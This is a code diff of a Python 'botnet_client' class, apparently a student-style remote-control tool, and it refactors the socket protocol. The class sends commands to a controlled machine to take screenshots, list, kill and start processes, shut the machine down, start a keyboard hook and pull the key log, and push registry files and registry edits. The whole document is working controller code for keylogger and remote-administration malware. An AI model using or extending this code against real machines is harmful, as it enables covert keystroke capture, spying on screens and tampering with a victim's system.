@@ -1,30 +1,29 @@
 import socket
 import io
 import PIL.Image
+import time
 
 class botnet_client:
 #-------------------PRIVATE AREA-------------------
     HOST = '127.0.0.1'  # The default server's hostname or IP address
     PORT = 26101  # The default port used by the server
     BUF_SIZE = 256
-    def __init__(self, host = HOST, port = PORT):
+    def __init__(self, host = HOST, port = PORT, buf_size = BUF_SIZE):
         self.host = host
         self.port = port
+        self.buf_size = buf_size
         self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     #destructor of object
     def __del__(self):
-        if (self.nr != None):
-            self.nr.close()
-            self.nw.close()
-            self.conn.close()
-            self.nr = None
+        self.close_connect()
             
     def __recv(self):
+        self.conn.send(b"1")
         size = int(self.nr.readline().strip())
         chunks = []
         while size > 0:
-            chunk = self.conn.recv(min(size, BUF_SIZE))
+            chunk = self.conn.recv(min(size, self.buf_size))
             if chunk == b'':
                 raise RuntimeError("socket connection broken")
             chunks.append(chunk)
@@ -32,9 +31,13 @@ class botnet_client:
         return b''.join(chunks)
     
     def __send(self, data):
+        self.conn.recv(1)
         self.nw.write(str(len(data)) + '\n'); self.nw.flush()
         self.conn.sendall(data)
         
+    # send request
+    def __send_msg(self, msg):
+        self.__send(bytes(msg, 'utf-8'))
         
 #-------------------PUBLIC AREA-------------------
     def set(self, host = HOST, port = PORT):
@@ -52,46 +55,41 @@ class botnet_client:
     
     def close_connect(self):
         if (self.nr != None):
-            self.send_message("QUIT")
+            self.__send_msg("QUIT")
             self.nr.close()
             self.nw.close()
             self.conn.close()
             self.nr = None
     
-    # send request
-    def send_message(self, msg):
-        self.nw.write(msg + '\n')
-        self.nw.flush()
-    
     # get screenshot of botnet
     def get_screenshot(self):
-        self.send_message("PIC")
+        self.__send_msg("PIC")
         # receive data
         data = self.__recv()
         # write data to image
         image = PIL.Image.open(io.BytesIO(data))
-        self.conn.recv(1)
+        ok = self.conn.recv(1)
         return image
     
     # get list of running process of botnet
     def get_list_process(self):
-        self.send_message("PROC")
+        self.__send_msg("PROC")
         size = int(self.nr.readline().strip())
         procs = []
         for i in range(size):
             proc = []
-            proc.append(self.nr.readline().strip()) # process name
-            proc.append(self.nr.readline().strip()) # process id
-            proc.append(self.nr.readline().strip()) # thread count
+            proc.append(self.__recv().decode('utf-8')) # process name
+            proc.append(self.__recv().decode('utf-8')) # process id
+            proc.append(self.__recv().decode('utf-8')) # thread count
             # add proc to list
             procs.append(proc)
-        self.conn.recv(1)
+        ok = self.conn.recv(1)
         return procs
     
     # kill process of botnet by pid
     # return string (successful/failed)
     def kill_process(self, pid):
-        self.send_message("KILLPROC")
+        self.__send_msg("KILLPROC")
         self.nw.write(str(pid) + '\n'); self.nw.flush()
         ok = self.conn.recv(1)
         if (ok != b'0'):
@@ -101,7 +99,7 @@ class botnet_client:
         
     # start process of botnet by name
     def start_process(self, name):
-        self.send_message("STARTPROC")
+        self.__send_msg("STARTPROC")
         self.nw.write(str(name) + '\n'); self.nw.flush()
         ok = self.conn.recv(1)
         if (ok != b'0'):
@@ -111,22 +109,22 @@ class botnet_client:
     
     # get list of running process of botnet
     def get_list_app(self):
-        self.send_message("APP")
+        self.__send_msg("APP")
         size = int(self.nr.readline().strip())
-        procs = []
+        apps = []
         for i in range(size):
-            proc = []
-            proc.append(self.nr.readline().strip()) # process name
-            proc.append(self.nr.readline().strip()) # process id
-            proc.append(self.nr.readline().strip()) # thread count
+            app = []
+            app.append(self.__recv().decode('utf-8')) # app name
+            app.append(self.__recv().decode('utf-8')) # app id
+            app.append(self.__recv().decode('utf-8')) # thread count
             # add proc to list
-            procs.append(proc)
-        self.conn.recv(1)
-        return procs
+            apps.append(app)
+        ok = self.conn.recv(1)
+        return apps
     
     # kill process of botnet by pid
     def kill_app(self, pid):
-        self.send_message("KILLAPP")
+        self.__send_msg("KILLAPP")
         self.nw.write(str(pid) + '\n'); self.nw.flush()
         ok = self.conn.recv(1)
         if (ok != b'0'):
@@ -136,7 +134,7 @@ class botnet_client:
         
     # start process of botnet by name
     def start_app(self, name):
-        self.send_message("STARTAPP")
+        self.__send_msg("STARTAPP")
         self.nw.write(str(name) + '\n'); self.nw.flush()
         ok = self.conn.recv(1)
         if (ok != b'0'):
@@ -146,7 +144,7 @@ class botnet_client:
         
     # shut down server
     def shutdown(self):
-        self.send_message("SHUTDOWN")
+        self.__send_msg("SHUTDOWN")
         ok = self.conn.recv(1)
         if (ok != b'0'):
             return "Shutdown server successfully!"
@@ -155,7 +153,7 @@ class botnet_client:
     
     # start hook key
     def hook_key(self):
-        self.send_message("HOOK")
+        self.__send_msg("HOOK")
         ok = self.conn.recv(1)
         if (ok != b'0'):
             return "Hook key successfully!"
@@ -164,7 +162,7 @@ class botnet_client:
     
     # end hook key
     def unhook_key(self):
-        self.send_message("UNHOOK")
+        self.__send_msg("UNHOOK")
         ok = self.conn.recv(1)
         if (ok != b'0'):
             return "Unhook key successfully!"
@@ -173,17 +171,15 @@ class botnet_client:
     
     # get key log of server
     def get_key_log(self):
-        self.send_message("KEYLOG")
+        self.__send_msg("KEYLOG")
         data = self.__recv()
-        self.conn.recv(1)
+        ok = self.conn.recv(1)
         return data.decode("utf-8")
     
     # send registry file to server
     def send_reg_text(self, reg_txt):
-        self.send_message("REGFILE")
-        data = str.encode(reg_txt)
-        self.conn.recv(1)
-        self.__send(data)
+        self.__send_msg("REGFILE")
+        self.__send(bytes(reg_txt, "utf-8"))
         ok = self.conn.recv(1)
         if (ok != b'0'):
             return "Execute registry file successfully!"
@@ -192,7 +188,7 @@ class botnet_client:
     
     # send refistry command to server
     def send_reg_cmd(self, cmd, path, val_name, val, val_type):
-        self.send_message("REGCMD")
+        self.__send_msg("REGCMD")
         self.nw.write(cmd + '\n'); self.nw.flush()
         self.nw.write(path + '\n'); self.nw.flush()
         self.nw.write(val_name + '\n'); self.nw.flush()
@@ -218,9 +214,3 @@ class botnet_client:
                 return "Wrong registry command!\n"
         else:
             return "Failed to modify registry!\n"
-
-'''cl = botnet_client()
-cl.connect()
-
-cl.get_screenshot().save("test.png")
-cl.close_connect()'''
